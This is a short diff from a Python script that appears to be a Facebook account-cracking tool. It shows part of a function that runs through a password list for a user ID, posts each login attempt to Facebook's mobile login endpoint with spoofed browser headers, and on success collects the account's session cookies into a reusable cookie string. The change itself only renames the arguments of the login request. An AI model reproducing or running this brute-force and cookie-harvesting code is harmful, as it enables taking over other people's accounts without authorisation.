@@ -1306,7 +1306,7 @@ def rndm4(uid,passlist):
 'user-agent': 'Mozilla/5.0 (Linux; Android zh-cn 8; Redmi X Build/2423.0.015) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4618.94 RealmeBrowser/35.5.0.812.18.3-gn',
 'x-asbd-id': '129477',
 'x-fb-lsd': 'AVpIztggBCA'}
-                        session.post(f'https://m.facebook.com/login/device-based/login/async/',data=info,headers=update).text
+                        session.post(f'https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                                         coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
